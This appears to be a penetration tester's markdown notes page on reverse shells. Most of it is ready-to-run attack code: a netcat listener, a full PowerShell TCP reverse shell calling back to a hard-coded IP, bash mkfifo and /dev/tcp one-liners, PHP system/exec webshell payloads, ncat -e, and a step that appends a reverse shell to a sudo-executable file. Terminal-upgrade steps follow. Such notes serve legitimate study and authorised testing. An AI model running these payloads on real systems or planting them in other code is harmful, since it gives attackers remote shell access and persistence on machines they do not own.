---
id: Reverse Shell
aliases:
  - Revshell
tags:
  - Pentest/Reverse-Shell
---

<!-- Reverse Shell {{{-->
# Reverse Shell

The concept of a **Reverse Shell** is that
the target’s machine acts as a client
and the attacker’s machine acts as a server

The target machine is initiating the connection to the attacker machine,
potentially bypassing security measures
(*e.g., firewalls*)

<!-- Tip {{{-->
> [!tip]-
>
> Common ports:
>
> - [[HTTP/General|HTTP]]: `443`
<!-- }}} -->

1. **Attacker**: Listen on port `443`

```sh
nc -lvnp 443
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> kali@kali:~$ nc -lvnp 443
> ```
> ```sh
> Listening on [0.0.0.0] (family 0, port 443)
> ```
<!-- }}} -->

2. **Target**: Establish a reverse shell

<!-- Resources {{{-->
> [!info]- Resources
>
> - [RevShells.com](https://www.revshells.com/)
>
> - [InternalAllTheThings - Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
>
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
> ```
<!-- }}} -->
___

<!-- Bash {{{-->
## Bash

Upgrade shell

```sh
script /dev/null -c bash
```

```sh
SHELL=/bin/bash script -q /dev/null
```

Append shell to sudo-executable file

```sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <attacker_port> >/tmp/f' | tee -a <file.sh>
```

Spawn an interactive shell

1. Suspend the current process

`^Z` (*CTRL+Z*)

2. Raw terminal mode with desable `echo` & bring [[Netcat]] to the foreground

```sh
stty raw -echo; fg
```

3. Export the `TERM` variable

```sh
export TERM=xterm
```

___
<!-- }}} -->

<!-- Netcat {{{-->
## Netcat

```sh
ncat <attacker_ip> <attacker_port> -e /bin/bash
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ncat 10.21.196.86 1234 -e /bin/bash
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- PowerShell {{{-->
## PowerShell

- [Nishang](https://github.com/samratashok/nishang/tree/master)

Offensive PowerShell for red team, penetration testing and offensive security

___
<!-- }}} -->

<!-- Python {{{-->
## Python

Check if Python is installed on the server

```sh
which python
```

```sh
which python3
```

Spawn an interactive shell

1. Spawn a pseudo terminal with Python

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> [!info]-
>
> - `-c`: Run the following Python code in the command line
> - `import pty`: Import the pseudo-terminal module
> - `pty.spawn("/bin/bash")`: Spawn a new process
>   and connect it to the pseudo-terminal

2. Explot the `TERM` variable

```sh
export TERM=xterm
```

___
<!-- }}} -->

<!-- PHP {{{-->
## PHP

```php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <attacker_port> >/tmp/f"); ?>
```
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'"); ?>
```
___
<!-- }}}-->

<!-- Upgrading TTY {{{-->
## Upgrading TTY

Map the TTY with the remote TTY

<!-- Resources {{{-->
> [!info]- Resources
>
> - [Upgrading Simple Shells to Fully Interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
>
<!-- }}} -->

1. Hit `Ctrl + Z` to background the shell
   and get back to the local terminal

```sh
^Z
```

2. Raw terminal mode with disabled `echo`
   & bring [[Netcat]] to the foreground

```sh
stty raw -echo; fg
```

3. Hit `Enter` (*or input `reset` and hit `Enter`*)

4. Set shell variables to make the terminal full screen

Show `TERM` value

```sh
export TERM=xterm
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> export TERM=xterm
> ```
> ```sh
> xterm-256color
> ```
<!-- }}} -->

Show `rows` and `columns` values

```sh
stty size
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> stty size
> ```
> ```sh
> 67 318
> ```
<!-- }}} -->

Set `TERM`

```sh
export TERM=xterm-256color
````

```sh
export TERM=screen
````

Set `rows` and `columns`

```sh
stty rows 67 columns 318
```
___
<!-- }}} -->

<!-- }}} -->
